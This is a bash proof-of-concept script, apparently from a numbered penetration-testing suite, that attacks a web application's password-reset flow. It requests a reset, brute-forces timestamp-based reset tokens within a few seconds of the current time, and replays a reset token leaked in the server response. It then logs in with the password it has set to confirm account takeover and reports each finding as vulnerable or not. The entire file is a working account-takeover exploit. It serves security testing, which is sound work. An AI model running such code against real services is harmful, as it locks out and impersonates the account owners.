#!/usr/bin/env bash
# poc/4.6_reset_token.sh
# Usage: ./poc/4.6_reset_token.sh <email> <password>

set +e
set +o pipefail

source "$(dirname "$0")/config.sh"

EMAIL="${1:-}"
PASS="${2:-}"

if [ -z "$EMAIL" ]; then
    echo "Usage: $0 <email>"
    exit 2
fi

FORGOT_URL="$BASE_URL/forgot-password"
RESET_URL="$BASE_URL/reset-password"
LOGIN_URL="$BASE_URL/login"

mkdir -p "$OUT_DIR"
OUT_FILE="$OUT_DIR/46_reset_token_$(date +%s).txt"
: > "$OUT_FILE"

log() { echo "$*" | tee -a "$OUT_FILE"; }

log "=== 4.6: password reset token attack ==="
log "target: $BASE_URL | user: $EMAIL"
log ""

# step 1: trigger forgot-password
log "[1] forgot-password"
FORGOT_BODY="$(curl -s -X POST "$FORGOT_URL" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$EMAIL\"}")"
CODE_FORGOT="$(curl -s -o /dev/null -w "%{http_code}" -X POST "$FORGOT_URL" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$EMAIL\"}")"
log "    status: $CODE_FORGOT"

# step 2: brute-force timestamp tokens
log "[2] brute-force timestamp tokens (now ± 5s)"
NOW="$(date +%s)"
BRUTE_OK=0
BRUTE_PASS="BruteForced@1"
for DELTA in -5 -4 -3 -2 -1 0 1 2 3 4 5; do
    CANDIDATE="$((NOW + DELTA))"
    CODE_BF="$(curl -s -o /dev/null -w "%{http_code}" -X POST "$RESET_URL" \
        -H "Content-Type: application/json" \
        -d "{\"token\":\"$CANDIDATE\",\"password\":\"$BRUTE_PASS\"}")"
    log "    token=$CANDIDATE status=$CODE_BF"
    [ "$CODE_BF" = "200" ] && BRUTE_OK=1
done

# step 3: token reuse
log "[3] token reuse (replay)"
TOKEN="$(echo "$FORGOT_BODY" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('reset_token',''))" 2>/dev/null)"

REUSE_PASS="Second@Reset2"
if [ -z "$TOKEN" ]; then
    log "    token not exposed in response (skipping reuse test)"
    CODE_R1="skip"; CODE_R2="skip"
else
    log "    token received: $TOKEN"
    CODE_R1="$(curl -s -o /dev/null -w "%{http_code}" -X POST "$RESET_URL" \
        -H "Content-Type: application/json" \
        -d "{\"token\":\"$TOKEN\",\"password\":\"First@Reset1\"}")"
    log "    first use: $CODE_R1"

    CODE_R2="$(curl -s -o /dev/null -w "%{http_code}" -X POST "$RESET_URL" \
        -H "Content-Type: application/json" \
        -d "{\"token\":\"$TOKEN\",\"password\":\"$REUSE_PASS\"}")"
    log "    second use (replay): $CODE_R2"
fi

# step 4: confirm account takeover — use the last successful password
log "[4] login with attacker password"
# token reuse is tried last so its password overwrites brute-force if both succeeded
ATK_PASS=""
[ "$BRUTE_OK" = "1" ] && ATK_PASS="$BRUTE_PASS"
[ "$CODE_R2" = "200" ] && ATK_PASS="$REUSE_PASS"

if [ -z "$ATK_PASS" ]; then
    log "    no attack succeeded, skipping"
    CODE_ATK="skip"
else
    CODE_ATK="$(curl -s -o /dev/null -w "%{http_code}" -X POST "$LOGIN_URL" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$EMAIL\",\"password\":\"$ATK_PASS\"}")"
    log "    status: $CODE_ATK"
fi

log ""
log "=== verdict ==="

VULN=0

if [ "$BRUTE_OK" = "1" ]; then
    log "[VULNERABLE] predictable token: brute-force succeeded"
    VULN=1
else
    log "[OK] predictable token: no timestamp token accepted"
fi

if [ "$CODE_R1" = "skip" ]; then
    log "[OK] token not exposed in response"
elif [ "$CODE_R2" = "200" ]; then
    log "[VULNERABLE] token reuse: same token accepted twice"
    VULN=1
else
    log "[OK] token reuse: second use rejected ($CODE_R2)"
fi

if [ "$CODE_ATK" = "skip" ]; then
    log "[OK] no attack vector succeeded"
elif [ "$CODE_ATK" = "200" ]; then
    log "[VULNERABLE] account takeover confirmed"
    VULN=1
else
    log "[OK] attacker login rejected ($CODE_ATK)"
fi

[ "$VULN" = "1" ] && exit 1 || exit 0